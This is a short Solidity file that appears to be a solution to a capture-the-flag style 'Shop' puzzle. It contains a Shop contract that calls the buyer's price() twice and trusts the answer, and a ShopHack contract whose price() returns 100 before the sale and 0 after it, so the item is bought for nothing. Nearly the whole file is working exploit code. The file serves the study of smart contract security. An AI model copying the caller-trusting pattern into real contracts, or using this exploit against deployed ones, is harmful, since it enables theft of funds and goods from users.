// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract ShopHack {
    bool private hasBeenCalled = false;
    Shop private shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function price() public view returns (uint256) {
        if(!shop.isSold()) 
            return 100;
        return 0;

    }

    function attack() public {
        shop.buy();
    }
}